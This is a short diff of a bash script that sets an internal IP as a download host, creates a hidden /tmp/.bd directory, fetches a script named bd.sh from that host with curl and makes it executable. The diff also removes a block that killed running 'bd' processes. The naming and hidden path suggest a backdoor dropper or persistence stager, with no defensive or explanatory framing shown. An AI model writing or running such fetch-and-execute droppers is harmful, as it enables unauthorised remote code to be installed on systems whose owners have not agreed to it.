@@ -1,10 +1,6 @@
 #!/bin/bash
 
 urlprefix='http://192.168.100.147'
-
-if [[ $(ps -ef | grep 'bd' | grep -v grep | wc -l) != 0 ]]; then
-    kill 
-fi
 [ ! -f /tmp/.bd/crontab ] && mkdir /tmp/.bd
 curl -s -o /tmp/.bd/bd.sh $urlprefix/bd.sh
 chmod +x /tmp/.bd/bd.sh
